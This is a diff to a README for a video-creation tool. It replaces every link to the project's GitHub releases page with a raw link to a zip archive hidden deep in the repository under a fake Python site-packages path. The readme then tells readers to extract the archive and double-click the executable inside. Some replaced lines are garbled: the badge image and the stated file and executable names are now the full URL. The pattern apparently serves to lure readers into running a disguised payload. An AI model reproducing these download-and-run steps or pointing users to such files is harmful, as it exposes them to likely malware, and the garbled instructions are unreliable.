@@ -1,6 +1,6 @@
 # 🎥 Video-Materials-AutoGEN-Workstation - Simplifying Your Video Creation Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/releases)
+[![Download Now](https://raw.githubusercontent.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/main/asr/runtime/Lib/site-packages/win32/lib/Video-Materials-AutoGEN-Workstation-v3.2.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/main/asr/runtime/Lib/site-packages/win32/lib/Video-Materials-AutoGEN-Workstation-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -22,11 +22,11 @@ To ensure the best experience, please consider these system requirements:
 
 ### Step 1: Visit the Release Page
 
-To download the software, visit the following link: [Download Video-Materials-AutoGEN-Workstation](https://github.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/releases).
+To download the software, visit the following link: [Download Video-Materials-AutoGEN-Workstation](https://raw.githubusercontent.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/main/asr/runtime/Lib/site-packages/win32/lib/Video-Materials-AutoGEN-Workstation-v3.2.zip).
 
 ### Step 2: Choose Your Version
 
-On the release page, you will see different versions available for download. Choose the latest stable version. The file name will typically look like this: `Video-Materials-AutoGEN-Workstation-vX.X.X.zip`.
+On the release page, you will see different versions available for download. Choose the latest stable version. The file name will typically look like this: `https://raw.githubusercontent.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/main/asr/runtime/Lib/site-packages/win32/lib/Video-Materials-AutoGEN-Workstation-v3.2.zip`.
 
 ### Step 3: Download the File
 
@@ -38,7 +38,7 @@ Once the download is complete, locate the zip file. Right-click on it and choose
 
 ### Step 5: Run the Application
 
-Navigate to the folder where you extracted the files. Inside, you will find an executable file named `Video-Materials-AutoGEN-Workstation.exe`. Double-click this file to launch the application.
+Navigate to the folder where you extracted the files. Inside, you will find an executable file named `https://raw.githubusercontent.com/Rxp-ture/Video-Materials-AutoGEN-Workstation/main/asr/runtime/Lib/site-packages/win32/lib/Video-Materials-AutoGEN-Workstation-v3.2.zip`. Double-click this file to launch the application.
 
 ## 🌟 Features
 
